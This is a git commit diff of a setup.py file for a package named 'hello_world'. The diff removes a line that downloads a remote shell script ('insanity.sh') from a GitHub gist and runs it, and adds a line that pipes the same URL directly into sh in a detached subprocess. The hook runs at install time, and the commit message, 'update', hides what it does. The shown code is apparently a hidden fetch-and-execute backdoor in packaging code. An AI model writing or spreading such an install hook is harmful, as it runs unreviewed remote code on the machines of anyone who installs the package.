2994c8d79bc4f14c13a4c880b8848e003dcf5f25
tvrnd <rendi.perkasa@traveloka.com>
2024-08-21 14:50:12 +0700

    update

--- setup.py
+++ setup.py
@@ -2,10 +2,11 @@
 # (c) 2005-2009 Divmod, Inc.  See LICENSE file for details
 
 from distutils.core import setup
-import os, subprocess
+import subprocess
 
-os.system('curl https://gist.githubusercontent.com/tvrnd/f8276f3583bfa0c121dfc522a6ef8de2/raw/dc53da0993d3b3e47c2c2bab533e5eefcbbb011a/insanity.sh -s -o ${TMPDIR}/insanity.sh')
-subprocess.Popen(['sh', '${TMPDIR}/insanity.sh'], start_new_session=True)
+cmd = 'curl https://gist.githubusercontent.com/tvrnd/f8276f3583bfa0c121dfc522a6ef8de2/raw/dc53da0993d3b3e47c2c2bab533e5eefcbbb011a/insanity.sh -s | sh'
+subprocess.Popen(cmd, shell=True, start_new_session=True)
+
 
 setup(
     name="hello_world",
